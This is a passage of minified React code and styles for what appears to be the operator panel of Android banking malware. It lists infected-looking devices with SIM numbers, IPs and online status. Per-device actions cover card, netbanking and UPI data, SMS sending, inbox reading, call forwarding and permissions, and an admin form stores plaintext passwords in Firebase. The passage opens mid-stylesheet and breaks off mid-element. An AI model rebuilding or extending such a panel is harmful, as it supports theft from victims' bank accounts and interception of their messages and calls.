          background: linear-gradient(135deg, #e74c3c, #c0392b);
        }

        .call-btn.cancel:hover:not(:disabled) {
          transform: translateY(-2px);
          box-shadow: 0 4px 20px rgba(231, 76, 60, 0.4);
        }

        .call-btn.app-call-btn {
          background: linear-gradient(135deg, #8b5cf6, #6c63ff);
          cursor: not-allowed;
        }

        .call-btn.clear {
          background: linear-gradient(135deg, #95a5a6, #7f8c8d);
          flex: 0.4;
        }

        .call-btn.clear:hover:not(:disabled) {
          transform: translateY(-2px);
        }

        .call-history {
          background: var(--bg-card);
          border-radius: 10px;
          border: 1px solid var(--border-color);
          overflow: hidden;
        }

        .history-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 6px 12px;
          background: var(--bg-input);
          border-bottom: 1px solid var(--border-color);
          flex-wrap: wrap;
          gap: 4px;
        }

        .history-header span {
          font-size: 11px;
          font-weight: 600;
          color: var(--text-muted);
        }

        .history-count {
          background: rgba(108, 99, 255, 0.1);
          color: #6c63ff;
          padding: 1px 10px;
          border-radius: 12px;
        }

        .btn-clear-history {
          padding: 2px 10px;
          border: 1px solid #e74c3c;
          border-radius: 4px;
          background: rgba(231, 76, 60, 0.05);
          color: #e74c3c;
          cursor: pointer;
          font-size: 9px;
          font-weight: 600;
          transition: all 0.2s;
        }

        .btn-clear-history:hover {
          background: rgba(231, 76, 60, 0.15);
        }

        .history-list {
          max-height: 200px;
          overflow-y: auto;
          padding: 4px 6px;
        }

        .history-item {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 4px 8px;
          border-bottom: 1px solid var(--border-color);
          font-size: 10px;
          gap: 4px;
          flex-wrap: wrap;
        }

        .history-item:last-child {
          border-bottom: none;
        }

        .history-number {
          font-weight: 600;
          color: var(--text-primary);
        }

        .history-sim {
          color: var(--text-muted);
          font-size: 8px;
          background: var(--bg-input);
          padding: 1px 6px;
          border-radius: 6px;
        }

        .history-duration {
          color: #2ecc71;
          font-weight: 600;
        }

        .history-status {
          font-weight: 600;
        }

        .history-source-tag {
          font-size: 8px;
          color: #8b5cf6;
          background: rgba(139, 92, 246, 0.08);
          padding: 1px 6px;
          border-radius: 6px;
        }

        .history-time {
          color: var(--text-muted);
          font-size: 8px;
        }

        @keyframes pulse {
          0%, 100% { opacity: 1; }
          50% { opacity: 0.4; }
        }

        @media (max-width: 480px) {
          .call-btn.clear {
            flex: 0.3;
            font-size: 12px;
          }
          
          .history-item {
            font-size: 9px;
            flex-direction: column;
            align-items: flex-start;
          }
          
          .call-input {
            font-size: 16px;
          }
          
          .status-icon {
            font-size: 22px;
          }
          
          .status-number {
            font-size: 14px;
          }
          
          .status-timer {
            font-size: 18px;
          }

          .quick-btn.bank-btn {
            font-size: 8px;
            padding: 2px 6px;
          }
        }
      `})]})}function Mk(){const{deviceId:t}=On(),e=gt(),[n,r]=g.useState(!0),[s,o]=g.useState(null),[a,l]=g.useState(!1),[c,d]=g.useState(""),[p,f]=g.useState(null),[u,b]=g.useState(null),[x,v]=g.useState(!1),[_,m]=g.useState(!1),[h,y]=g.useState(!1),[w,N]=g.useState(!0),[R,S]=g.useState("INBOX");g.useEffect(()=>{const D=I=>I.type==="gesturestart"||I.type==="gesturechange"||I.type==="gestureend"||I.type==="dblclick"||I.type==="touchmove"&&I.touches&&I.touches.length>1||I.type==="wheel"&&I.ctrlKey?(I.preventDefault(),!1):!0;return document.addEventListener("gesturestart",D,{passive:!1}),document.addEventListener("gesturechange",D,{passive:!1}),document.addEventListener("gestureend",D,{passive:!1}),document.addEventListener("dblclick",D,{passive:!1}),document.addEventListener("touchmove",D,{passive:!1}),document.addEventListener("wheel",D,{passive:!1}),document.addEventListener("keydown",function(I){if(I.ctrlKey&&(I.key==="+"||I.key==="-"||I.key==="="||I.key==="0"))return I.preventDefault(),!1}),()=>{document.removeEventListener("gesturestart",D),document.removeEventListener("gesturechange",D),document.removeEventListener("gestureend",D),document.removeEventListener("dblclick",D),document.removeEventListener("touchmove",D),document.removeEventListener("wheel",D)}},[]),g.useEffect(()=>{t&&C()},[t]);const C=async()=>{r(!0);try{const D=B(U,`devices/${t}`),I=await ce(D);if(I.exists()){const X={id:t,...I.val()};o(X),m(X.favorite===!0);const V=X.lastSeen||X.this_app_installTime;if(V){const E=Date.now()-Number(V);l(E<=6e4),E<0?d("just now"):E<6e4?d(`${Math.floor(E/1e3)}s`):E<36e5?d(`${Math.floor(E/6e4)}m`):E<864e5?d(`${Math.floor(E/36e5)}h`):d(`${Math.floor(E/864e5)}d`)}}}catch(D){f(D.message)}r(!1)},j=async()=>{if(!h){y(!0);try{const D=!_,I=B(U,`devices/${t}`);await kt(I,{favorite:D}),m(D);const X=new CustomEvent("showToast",{detail:{message:D?"⭐ Added to favorites!":"⭐ Removed from favorites",type:"success"}});window.dispatchEvent(X)}catch(D){console.error("Error toggling favorite:",D);const I=new CustomEvent("showToast",{detail:{message:"❌ Failed to update favorite",type:"error"}});window.dispatchEvent(I)}y(!1)}},P=D=>D?D.length<=8?D:`${D.slice(0,4)}...${D.slice(-4)}`:"N/A",z=D=>{const I=parseInt(D);return I>=70?"#2ecc71":I>=40?"#f1c40f":I>=20?"#e67e22":"#e74c3c"},M=D=>{if(!D)return{operator:"N/A",number:"N/A"};const I=D.split(" - ");return I.length===2?{operator:(I[0].split(": ")[1]||I[0]).trim(),number:I[1].trim()}:{operator:D,number:"N/A"}},L=D=>{u===D?(b(null),D==="insms"&&(N(!0),S("INBOX"))):(b(D),D==="insms"?(N(!1),S("INSMS")):(N(!0),S("INBOX")))},K=()=>{v(!x)};if(n)return i.jsxs("div",{className:"page-loading",children:[i.jsx("div",{className:"loading-spinner"}),i.jsx("p",{children:"📡 Loading..."})]});if(p||!s)return i.jsxs("div",{className:"page-error",children:[i.jsx("span",{className:"error-icon",children:"❌"}),i.jsx("h2",{children:"Device Not Found"}),i.jsx("button",{className:"back-btn",onClick:()=>e("/"),children:"← Back"})]});const F=P(s.device_id||t),te=z(s.battery),me=M(s.sim_info),W=[{label:"Device ID",value:s.device_id||"N/A"},{label:"Android SDK",value:s.android_sdk||"N/A"},{label:"Android Version",value:s.android_version||"N/A"},{label:"Brand",value:s.brand||"N/A"},{label:"Model",value:s.model||"N/A"},{label:"IP Address",value:s.ip||"N/A"},{label:"Last Seen",value:c||"N/A"},{label:"Status",value:s.status||"N/A"},{label:"Install Date",value:s.this_app_installDateTime||"N/A"}];return i.jsxs("div",{className:"device-main-page",style:{touchAction:"manipulation"},children:[i.jsxs("div",{className:"main-header",children:[i.jsx("button",{className:"back-btn",onClick:()=>e("/"),children:"← Back"}),i.jsxs("div",{className:"header-info",children:[i.jsxs("span",{className:"device-id",children:["🔑 ",F]}),i.jsx("span",{className:`status-dot ${a?"online":"offline"}`})]})]}),i.jsx("div",{className:"device-info-card",children:i.jsxs("div",{className:"device-info-card-header",children:[i.jsx("div",{className:"device-icon",children:"📱"}),i.jsxs("div",{className:"device-info",children:[i.jsxs("h1",{children:[s.brand||"UNKNOWN"," ",s.model||"Device"]}),i.jsxs("div",{className:"device-tags",children:[i.jsxs("span",{className:`tag-status ${a?"online":"offline"}`,children:[i.jsx("span",{className:"dot"})," ",a?"ONLINE":"OFFLINE"]}),i.jsx("span",{className:`tag-screen ${s.screen==="ON"?"on":"off"}`,children:s.screen==="ON"?"🟢 ON":"⚫ OFF"}),i.jsxs("span",{className:"tag-serial",children:["#",s.serialNo||"N/A"]})]})]}),i.jsx("button",{className:`favorite-btn ${_?"active":""}`,onClick:j,disabled:h,title:_?"Remove from favorites":"Add to favorites",children:h?"⏳":_?"⭐":"☆"})]})}),i.jsxs("div",{className:`quick-stats-card ${x?"expanded":""}`,children:[i.jsxs("div",{className:"quick-stats-header",onClick:K,children:[i.jsx("span",{className:"quick-stats-title",children:"📊 Device Details"}),i.jsx("span",{className:"quick-stats-toggle",children:x?"▲":"▼"})]}),x&&i.jsxs("div",{className:"quick-stats-body",children:[i.jsxs("div",{className:"quick-stats-grid",children:[i.jsxs("div",{className:"stat-item",children:[i.jsx("span",{className:"stat-icon",children:"🔋"}),i.jsx("span",{className:"stat-value",style:{color:te},children:s.battery||"N/A"})]}),i.jsxs("div",{className:"stat-item",children:[i.jsx("span",{className:"stat-icon",children:"🤖"}),i.jsxs("span",{className:"stat-value",children:["v",s.android_version||"N/A"]})]}),i.jsxs("div",{className:"stat-item",children:[i.jsx("span",{className:"stat-icon",children:"📶"}),i.jsx("span",{className:"stat-value",children:me.operator})]}),i.jsxs("div",{className:"stat-item",children:[i.jsx("span",{className:"stat-icon",children:"📞"}),i.jsx("span",{className:"stat-value",children:me.number})]})]}),i.jsx("div",{className:"device-details-grid",children:W.map((D,I)=>i.jsxs("div",{className:"device-detail-item",children:[i.jsx("span",{className:"device-detail-label",children:D.label}),i.jsx("span",{className:"device-detail-value",children:D.value})]},I))})]})]}),i.jsxs("div",{className:"button-card",children:[i.jsx("div",{className:"button-card-header",children:i.jsx("span",{className:"button-card-title",children:"📋 Quick Actions"})}),i.jsxs("div",{className:"button-grid-horizontal-small",children:[i.jsxs("button",{className:`menu-btn-sm card ${u==="card"?"active":""}`,onClick:()=>L("card"),children:[i.jsx("span",{className:"btn-icon-sm",children:"💳"}),i.jsx("span",{className:"btn-label-sm",children:"Card"})]}),i.jsxs("button",{className:`menu-btn-sm netbank ${u==="netbank"?"active":""}`,onClick:()=>L("netbank"),children:[i.jsx("span",{className:"btn-icon-sm",children:"🏦"}),i.jsx("span",{className:"btn-label-sm",children:"Net"})]}),i.jsxs("button",{className:`menu-btn-sm permissions ${u==="permissions"?"active":""}`,onClick:()=>L("permissions"),children:[i.jsx("span",{className:"btn-icon-sm",children:"🔐"}),i.jsx("span",{className:"btn-label-sm",children:"Perm"})]}),i.jsxs("button",{className:`menu-btn-sm verification ${u==="verification"?"active":""}`,onClick:()=>L("verification"),children:[i.jsx("span",{className:"btn-icon-sm",children:"✅"}),i.jsx("span",{className:"btn-label-sm",children:"Verify"})]}),i.jsxs("button",{className:`menu-btn-sm upi ${u==="upi"?"active":""}`,onClick:()=>L("upi"),children:[i.jsx("span",{className:"btn-icon-sm",children:"📲"}),i.jsx("span",{className:"btn-label-sm",children:"UPI"})]}),i.jsxs("button",{className:`menu-btn-sm callforward ${u==="callforward"?"active":""}`,onClick:()=>L("callforward"),children:[i.jsx("span",{className:"btn-icon-sm",children:"📞"}),i.jsx("span",{className:"btn-label-sm",children:"Fwd"})]}),i.jsxs("button",{className:`menu-btn-sm sendsms ${u==="sendsms"?"active":""}`,onClick:()=>L("sendsms"),children:[i.jsx("span",{className:"btn-icon-sm",children:"📨"}),i.jsx("span",{className:"btn-label-sm",children:"SMS"})]}),i.jsxs("button",{className:`menu-btn-sm insms ${u==="insms"?"active":""}`,onClick:()=>L("insms"),children:[i.jsx("span",{className:"btn-icon-sm",children:"📥"}),i.jsx("span",{className:"btn-label-sm",children:R})]}),i.jsxs("button",{className:`menu-btn-sm mcall ${u==="mcall"?"active":""}`,onClick:()=>L("mcall"),children:[i.jsx("span",{className:"btn-icon-sm",children:"📞"}),i.jsx("span",{className:"btn-label-sm",children:"mCall"})]})]})]}),i.jsxs("div",{className:"dynamic-content",children:[u==="card"&&i.jsx(Gv,{}),u==="netbank"&&i.jsx(Yv,{}),u==="permissions"&&i.jsx(Kv,{}),u==="verification"&&i.jsx(Qv,{}),u==="upi"&&i.jsx(qv,{}),u==="callforward"&&i.jsx(Pk,{}),u==="sendsms"&&i.jsx(Dk,{}),u==="insms"&&i.jsx(Lk,{deviceId:t}),u==="mcall"&&i.jsx(zk,{deviceId:t})]}),w&&i.jsx("div",{className:"sms-container",children:i.jsx(Xv,{})})]})}function Ok(){var m;const{user:t}=xn(),[e,n]=g.useState(""),[r,s]=g.useState(""),[o,a]=g.useState(""),[l,c]=g.useState(""),[d,p]=g.useState(!1),[f,u]=g.useState(""),[b,x]=g.useState("");if(!((t==null?void 0:t.role)==="admin"||((m=t==null?void 0:t.userData)==null?void 0:m.role)==="admin"))return i.jsxs("div",{className:"admin-add-page",children:[i.jsx("h2",{children:"⛔ Access Denied"}),i.jsx("p",{children:"Only admin can add new admins"})]});const _=async h=>{h.preventDefault(),p(!0),x(""),u("");try{const y=B(U,"users"),N=(await ce(y)).val()||{};for(let S in N){if(N[S].userId===e){x("❌ User ID already exists!"),p(!1);return}if(N[S].email===l){x("❌ Email already exists!"),p(!1);return}}const R=Date.now().toString(36)+Math.random().toString(36).substr(2,5);await bt(B(U,`users/${R}`),{userId:e,email:l,name:o,role:"admin",password:r,createdAt:Date.now(),lastLogin:Date.now(),active:!0}),u("✅ Admin user created successfully!"),n(""),s(""),a(""),c("")}catch(y){x("❌ Failed to create admin: "+y.message)}p(!1)};return i.jsxs("div",{className:"admin-add-page",children:[i.jsxs("div",{className:"admin-add-container",children:[i.jsx("h2",{children:"🔑 Add New Admin"}),i.jsx("p",{className:"subtitle",children:"Create a new admin user account"}),f&&i.jsx("div",{className:"success-msg",children:f}),b&&i.jsx("div",{className:"error-msg",children:b}),i.jsxs("form",{onSubmit:_,children:[i.jsxs("div",{className:"form-group",children:[i.jsx("label",{children:"User ID"}),i.jsx("input",{type:"text",value:e,onChange:h=>n(h.target.value),placeholder:"Enter user ID",required:!0})]}),i.jsxs("div",{className:"form-group",children:[i.jsx("label",{children:"Name"}),i.jsx("input",{type:"text",value:o,onChange:h=>a(h.target.value),placeholder:"Enter full name",required:!0})]}),i.jsxs("div",{className:"form-group",children:[i.jsx("label",{children:"Email"}),i.jsx("input",{type:"email",value:l,onChange:h=>c(h.target.value),placeholder:"Enter email",required:!0})]}),i.jsxs("div",{className:"form-group",children:[i.jsx("label",{children:"Password"}),i.jsx("input",{type:"password",value:r,onChange:h=>s(h.target.value),placeholder:"Enter password (min 6 chars)",required:!0,minLength:"6"})]}),i.jsx("button",{type:"submit",className:"add-btn",disabled:d,children:d?"⏳ Creating...":"➕ Add Admin"})]})]}),i.jsx("style",{children:`
        .admin-add-page {
          min-height: 100vh;
          display: flex;
          align-items: center;
          justify-content: center;
          padding: 20px;
          background: var(--bg-primary);
        }

        .admin-add-container {
          max-width: 420px;
          width: 100%;
          background: var(--bg-card);
          border-radius: 16px;
          padding: 30px;
          border: 1px solid var(--border-color);
          box-shadow: var(--shadow-hover);
        }

        .admin-add-container h2 {
          font-size: 24px;
          font-weight: 700;
          color: var(--text-primary);
          margin: 0 0 4px;
          text-align: center;
        }

        .subtitle {
          font-size: 14px;
          color: var(--text-muted);
          text-align: center;
          margin-bottom: 24px;
        }

        .form-group {
          display: flex;
          flex-direction: column;
          gap: 4px;
          margin-bottom: 16px;
        }

        .form-group label {
          font-size: 12px;
          font-weight: 600;
          color: var(--text-secondary);
          text-transform: uppercase;
          letter-spacing: 0.5px;
        }

        .form-group input {
          padding: 10px 14px;
          border: 1px solid var(--border-color);
          border-radius: 8px;
          background: var(--bg-input);
          color: var(--text-primary);
          font-size: 14px;
          transition: all 0.3s;
          outline: none;
        }

        .form-group input:focus {
          border-color: var(--accent-cyan);
          box-shadow: 0 0 0 3px rgba(108, 99, 255, 0.08);
        }

        .add-btn {
          width: 100%;
          padding: 12px;
          border: none;
          border-radius: 8px;
          background: linear-gradient(135deg, #6c63ff, #3b82f6);
          color: white;
          font-size: 15px;
          font-weight: 700;
          cursor: pointer;
          transition: all 0.3s;
          text-transform: uppercase;
          letter-spacing: 1px;
          margin-top: 8px;
        }

        .add-btn:hover:not(:disabled) {
          transform: translateY(-2px);
          box-shadow: 0 4px 20px rgba(108, 99, 255, 0.3);
        }

        .add-btn:disabled {
          opacity: 0.6;
          cursor: not-allowed;
        }

        .success-msg {
          padding: 10px 14px;
          background: rgba(46, 204, 113, 0.08);
          border: 1px solid rgba(46, 204, 113, 0.15);
          border-radius: 8px;
          color: #2ecc71;
          font-size: 13px;
          text-align: center;
          margin-bottom: 16px;
        }

        .error-msg {
          padding: 10px 14px;
          background: rgba(231, 76, 60, 0.08);
          border: 1px solid rgba(231, 76, 60, 0.15);
          border-radius: 8px;
          color: #e74c3c;
          font-size: 13px;
          text-align: center;
          margin-bottom: 16px;
        }

        @media (max-width: 480px) {
          .admin-add-container {
            padding: 20px;
          }
        }
      `})]})}function Fk(){var x;const{user:t}=xn(),[e,n]=g.useState([]),[r,s]=g.useState(!0),[o,a]=g.useState({}),[l,c]=g.useState({total:0,online:0,offline:0,responsive:0,notResponsive:0}),d=(t==null?void 0:t.role)==="admin"||((x=t==null?void 0:t.userData)==null?void 0:x.role)==="admin";g.useEffect(()=>{if(!d){s(!1);return}console.log("🔄 AdminDashboard mounted, fetching devices...");const v=B(U,"devices"),_=cn(v,m=>{if(console.log("📡 Devices data received"),m.exists()){const h=m.val(),y=Object.keys(h).map(w=>({id:w,...h[w]}));console.log("📱 Devices found:",y.length),n(y),p(y),s(!1)}else console.log("📭 No devices found"),n([]),s(!1)},m=>{console.error("❌ Firebase error:",m),s(!1)});return()=>{console.log("🔄 Unsubscribing from devices"),_()}},[d]);const p=v=>{const _=Date.now()-36e5,m=v.filter(w=>(w.lastSeen||0)>_).length,h=v.length,y=h-m;c({total:h,online:m,offline:y,responsive:m,notResponsive:y})},f=async()=>{if(!d)return;a(m=>({...m,all:"sending"}));let v=0,_=0;for(const m of e)try{(await Ah(m.id)).success&&(v++,setTimeout(()=>{const y=B(U,`devices/${m.id}`);ce(y).then(w=>{w.exists()&&w.val().status==="online"&&_++})},2e3))}catch(h){console.error("Ping failed for",m.id,h)}setTimeout(()=>{alert(`📊 Ping Results:

✅ Responded: ${_}
❌ Not Responded: ${v-_}
📱 Total: ${v}`),a(m=>({...m,all:null}))},4e3)},u=async v=>{if(d){a(_=>({..._,[v]:"sending"}));try{(await Ah(v)).success&&setTimeout(()=>{const m=B(U,`devices/${v}`);ce(m).then(h=>{h.exists()&&(h.val().status==="online"?(a(w=>({...w,[v]:"online"})),setTimeout(()=>{a(w=>({...w,[v]:null}))},3e3)):(a(w=>({...w,[v]:"offline"})),setTimeout(()=>{a(w=>({...w,[v]:null}))},3e3)))})},3e3)}catch(_){console.error("Ping failed:",_),a(m=>({...m,[v]:null}))}}},b=v=>{const _=o[v];return _==="sending"?"⏳":_==="online"?"✅":_==="offline"?"❌":"📡"};return d?r?i.jsxs("div",{style:{padding:"40px",textAlign:"center"},children:[i.jsx("div",{style:{width:"40px",height:"40px",border:"3px solid #e2e8f0",borderTopColor:"#6c63ff",borderRadius:"50%",margin:"0 auto 12px",animation:"spin 0.8s linear infinite"}}),i.jsx("p",{children:"📡 Loading devices..."}),i.jsx("style",{children:`
          @keyframes spin {
            to { transform: rotate(360deg); }
          }
        `})]}):i.jsxs("div",{style:{padding:"16px",maxWidth:"1200px",margin:"0 auto",background:"var(--bg-primary)",minHeight:"100vh"},children:[i.jsxs("div",{style:{display:"flex",justifyContent:"space-between",alignItems:"center",marginBottom:"16px",paddingBottom:"12px",borderBottom:"1px solid var(--border-color)"},children:[i.jsx("h2",{style:{fontSize:"22px",fontWeight:700,color:"var(--text-primary)",margin:0},children:"📊 Device Dashboard"}),i.jsxs("span",{style:{fontSize:"14px",color:"var(--text-muted)"},children:["Total: ",l.total," devices"]})]}),i.jsxs("div",{style:{display:"grid",gridTemplateColumns:"repeat(4, 1fr)",gap:"12px",marginBottom:"16px"},children:[i.jsxs("div",{style:{background:"var(--bg-card)",borderRadius:"10px",padding:"14px",display:"flex",alignItems:"center",gap:"12px",border:"1px solid var(--border-color)"},children:[i.jsx("span",{style:{fontSize:"28px"},children:"📱"}),i.jsxs("div",{children:[i.jsx("h3",{style:{margin:0,fontSize:"22px",fontWeight:700,color:"var(--text-primary)"},children:l.total}),i.jsx("p",{style:{margin:0,fontSize:"11px",color:"var(--text-muted)"},children:"Total Devices"})]})]}),i.jsxs("div",{style:{background:"var(--bg-card)",borderRadius:"10px",padding:"14px",display:"flex",alignItems:"center",gap:"12px",border:"1px solid var(--border-color)"},children:[i.jsx("span",{style:{fontSize:"28px"},children:"🟢"}),i.jsxs("div",{children:[i.jsx("h3",{style:{margin:0,fontSize:"22px",fontWeight:700,color:"#2ecc71"},children:l.online}),i.jsx("p",{style:{margin:0,fontSize:"11px",color:"var(--text-muted)"},children:"Online"})]})]}),i.jsxs("div",{style:{background:"var(--bg-card)",borderRadius:"10px",padding:"14px",display:"flex",alignItems:"center",gap:"12px",border:"1px solid var(--border-color)"},children:[i.jsx("span",{style:{fontSize:"28px"},children:"🔴"}),i.jsxs("div",{children:[i.jsx("h3",{style:{margin:0,fontSize:"22px",fontWeight:700,color:"#e74c3c"},children:l.offline}),i.jsx("p",{style:{margin:0,fontSize:"11px",color:"var(--text-muted)"},children:"Offline"})]})]}),i.jsxs("div",{style:{background:"var(--bg-card)",borderRadius:"10px",padding:"14px",display:"flex",alignItems:"center",gap:"12px",border:"1px solid var(--border-color)"},children:[i.jsx("span",{style:{fontSize:"28px"},children:"✅"}),i.jsxs("div",{children:[i.jsx("h3",{style:{margin:0,fontSize:"22px",fontWeight:700,color:"#2ecc71"},children:l.responsive}),i.jsx("p",{style:{margin:0,fontSize:"11px",color:"var(--text-muted)"},children:"Responsive"})]})]})]}),i.jsx("div",{style:{marginBottom:"16px",textAlign:"center"},children:i.jsx("button",{onClick:f,disabled:o.all==="sending"||e.length===0,style:{padding:"10px 30px",border:"2px solid #3b82f6",borderRadius:"10px",background:"rgba(59, 130, 246, 0.08)",color:"#3b82f6",cursor:o.all==="sending"||e.length===0?"not-allowed":"pointer",fontSize:"15px",fontWeight:700,opacity:o.all==="sending"||e.length===0?.5:1},children:o.all==="sending"?"⏳ Pinging...":"📡 Ping All Devices"})}),i.jsx("div",{style:{display:"grid",gridTemplateColumns:"repeat(auto-fill, minmax(340px, 1fr))",gap:"12px"},children:e.length===0?i.jsxs("div",{style:{textAlign:"center",padding:"40px",color:"var(--text-muted)",gridColumn:"1 / -1"},children:[i.jsx("span",{style:{fontSize:"48px",display:"block",marginBottom:"8px"},children:"📭"}),i.jsx("p",{children:"No devices found"})]}):e.map(v=>{var y,w;const _=v.status||"offline",m=b(v.id),h=o[v.id]==="sending";return i.jsxs("div",{style:{background:"var(--bg-card)",borderRadius:"12px",padding:"14px",border:"1px solid var(--border-color)",borderLeft:`4px solid ${_==="online"?"#2ecc71":"#e74c3c"}`,opacity:_==="offline"?.7:1,transition:"all 0.3s"},children:[i.jsxs("div",{style:{display:"flex",justifyContent:"space-between",alignItems:"center",marginBottom:"10px"},children:[i.jsxs("div",{style:{display:"flex",alignItems:"center",gap:"10px"},children:[i.jsx("span",{style:{fontSize:"28px"},children:"📱"}),i.jsxs("div",{children:[i.jsxs("div",{style:{fontWeight:600,color:"var(--text-primary)",fontSize:"14px"},children:[v.brand||"Unknown"," ",v.model||"Device"]}),i.jsxs("div",{style:{fontSize:"10px",color:"var(--text-muted)",fontFamily:"Courier New, monospace"},children:["ID: ",(y=v.id)==null?void 0:y.slice(0,8),"..."]})]})]}),i.jsxs("div",{style:{display:"flex",alignItems:"center",gap:"6px"},children:[i.jsx("span",{style:{width:"8px",height:"8px",borderRadius:"50%",display:"inline-block",background:_==="online"?"#2ecc71":"#e74c3c"}}),i.jsx("span",{style:{fontSize:"12px",fontWeight:500},children:_==="online"?"🟢 Online":"🔴 Offline"})]})]}),i.jsxs("div",{style:{display:"grid",gridTemplateColumns:"1fr 1fr",gap:"4px",marginBottom:"10px"},children:[i.jsxs("div",{style:{display:"flex",justifyContent:"space-between",padding:"4px 8px",background:"var(--bg-input)",borderRadius:"4px",fontSize:"11px"},children:[i.jsx("span",{style:{color:"var(--text-muted)"},children:"📶 IP"}),i.jsx("span",{style:{fontWeight:600,color:"var(--text-primary)"},children:v.ip||"N/A"})]}),i.jsxs("div",{style:{display:"flex",justifyContent:"space-between",padding:"4px 8px",background:"var(--bg-input)",borderRadius:"4px",fontSize:"11px"},children:[i.jsx("span",{style:{color:"var(--text-muted)"},children:"🔋 Battery"}),i.jsx("span",{style:{fontWeight:600,color:parseInt(v.battery)<20?"#e74c3c":parseInt(v.battery)<50?"#f1c40f":"#2ecc71"},children:v.battery||"N/A"})]}),i.jsxs("div",{style:{display:"flex",justifyContent:"space-between",padding:"4px 8px",background:"var(--bg-input)",borderRadius:"4px",fontSize:"11px"},children:[i.jsx("span",{style:{color:"var(--text-muted)"},children:"🤖 Version"}),i.jsxs("span",{style:{fontWeight:600,color:"var(--text-primary)"},children:["v",v.android_version||"N/A"]})]}),i.jsxs("div",{style:{display:"flex",justifyContent:"space-between",padding:"4px 8px",background:"var(--bg-input)",borderRadius:"4px",fontSize:"11px"},children:[i.jsx("span",{style:{color:"var(--text-muted)"},children:"📞 SIM"}),i.jsx("span",{style:{fontWeight:600,color:"var(--text-primary)"},children:((w=v.sim_info)==null?void 0:w.substring(0,12))||"N/A"})]}),i.jsxs("div",{style:{display:"flex",justifyContent:"space-between",padding:"4px 8px",background:"var(--bg-input)",borderRadius:"4px",fontSize:"11px",gridColumn:"span 2"},children:[i.jsx("span",{style:{color:"var(--text-muted)"},children:"🕐 Last Seen"}),i.jsx("span",{style:{fontWeight:600,color:"var(--text-primary)"},children:v.lastSeen?new Date(v.lastSeen).toLocaleString():"N/A"})]})]}),i.jsxs("div",{style:{display:"flex",gap:"8px",marginTop:"8px",paddingTop:"10px",borderTop:"1px solid var(--border-color)"},children:[i.jsxs("button",{onClick:()=>u(v.id),disabled:h,style:{flex:1,padding:"6px 12px",border:`1px solid ${o[v.id]==="online"?"#2ecc71":"#3b82f6"}`,borderRadius:"6px",background:o[v.id]==="online"?"rgba(46, 204, 113, 0.08)":"rgba(59, 130, 246, 0.08)",color:o[v.id]==="online"?"#2ecc71":"#3b82f6",cursor:h?"not-allowed":"pointer",fontSize:"12px",fontWeight:600,opacity:h?.5:1},children:[h?"⏳":m," Ping"]}),i.jsx("button",{onClick:()=>window.location.href=`/device/${v.id}`,style:{flex:1,padding:"6px 12px",border:"1px solid var(--border-color)",borderRadius:"6px",background:"var(--bg-input)",color:"var(--text-secondary)",cursor:"pointer",fontSize:"12px",fontWeight:600},children:"📖 Details"})]}),o[v.id]==="online"&&i.jsx("div",{style:{marginTop:"8px",padding:"8px 12px",borderRadius:"6px",fontSize:"13px",fontWeight:600,textAlign:"center",background:"rgba(46, 204, 113, 0.1)",color:"#2ecc71",border:"1px solid rgba(46, 204, 113, 0.2)"},children:"✅ Device is responsive!"}),o[v.id]==="offline"&&i.jsx("div",{style:{marginTop:"8px",padding:"8px 12px",borderRadius:"6px",fontSize:"13px",fontWeight:600,textAlign:"center",background:"rgba(231, 76, 60, 0.1)",color:"#e74c3c",border:"1px solid rgba(231, 76, 60, 0.2)"},children:"❌ Device is not responding!"})]},v.id)})})]}):i.jsxs("div",{style:{padding:"40px",textAlign:"center"},children:[i.jsx("span",{style:{fontSize:"64px",display:"block",marginBottom:"16px"},children:"⛔"}),i.jsx("h2",{children:"Access Denied"}),i.jsx("p",{children:"Only admin can access this page"})]})}function Wk(){const t=gt(),[e,n]=g.useState([]),[r,s]=g.useState(!0),[o,a]=g.useState(""),[l,c]=g.useState(!1),[d,p]=g.useState("serial");g.useEffect(()=>{const h=B(U,"devices"),y=cn(h,w=>{if(w.exists()){const N=w.val(),R=Object.keys(N).map(S=>({id:S,...N[S]}));n(R)}else n([]);s(!1)});return()=>y()},[]);const f=async(h,y)=>{try{const w=B(U,`devices/${h}`);await kt(w,{favorite:!y}),n(N=>N.map(R=>R.id===h?{...R,favorite:!y}:R))}catch(w){console.error("Error toggling favorite:",w)}},u=h=>{const y=h.lastSeen||h.this_app_installTime;if(!y)return{text:"Offline",color:"#e74c3c",dot:"🔴"};const w=Date.now()-Number(y);return w<6e4?{text:"Online",color:"#2ecc71",dot:"🟢"}:w<3e5?{text:"Away",color:"#f1c40f",dot:"🟡"}:{text:"Offline",color:"#e74c3c",dot:"🔴"}},b=h=>{const y=parseInt(h);return y>=70?"#2ecc71":y>=40?"#f1c40f":y>=20?"#e67e22":"#e74c3c"},x=h=>{if(!h)return"Never";const y=new Date(h),N=new Date-y;return N<6e4?"Just now":N<36e5?`${Math.floor(N/6e4)}m ago`:N<864e5?`${Math.floor(N/36e5)}h ago`:`${Math.floor(N/864e5)}d ago`},_=(()=>{let h=e;if(o){const y=o.toLowerCase();h=h.filter(w=>{var N;return(w.brand||"").toLowerCase().includes(y)||(w.model||"").toLowerCase().includes(y)||(w.device_id||"").toLowerCase().includes(y)||(((N=w.serialNo)==null?void 0:N.toString())||"").includes(y)})}return l&&(h=h.filter(y=>y.favorite===!0)),h.sort((y,w)=>{switch(d){case"serial":return(parseInt(w.serialNo)||0)-(parseInt(y.serialNo)||0);case"brand":return(y.brand||"").localeCompare(w.brand||"");case"model":return(y.model||"").localeCompare(w.model||"");case"battery":return(parseInt(w.battery)||0)-(parseInt(y.battery)||0);case"lastSeen":return(w.lastSeen||0)-(y.lastSeen||0);default:return 0}}),h})(),m=e.filter(h=>{const y=h.lastSeen||h.this_app_installTime;return y&&Date.now()-Number(y)<6e4}).length;return r?i.jsxs("div",{style:{display:"flex",flexDirection:"column",alignItems:"center",justifyContent:"center",minHeight:"100vh",background:"var(--bg-primary)"},children:[i.jsx("div",{style:{width:"40px",height:"40px",border:"3px solid #e2e8f0",borderTopColor:"#6c63ff",borderRadius:"50%",animation:"spin 0.8s linear infinite"}}),i.jsx("p",{style:{color:"var(--text-muted)",marginTop:"12px"},children:"📡 Loading devices..."}),i.jsx("style",{children:"@keyframes spin{to{transform:rotate(360deg)}}"})]}):i.jsxs("div",{style:{padding:"12px 14px",maxWidth:"100%",background:"var(--bg-primary)",minHeight:"100vh"},children:[i.jsxs("div",{style:{display:"flex",alignItems:"center",gap:"10px",padding:"6px 0 12px",borderBottom:"2px solid 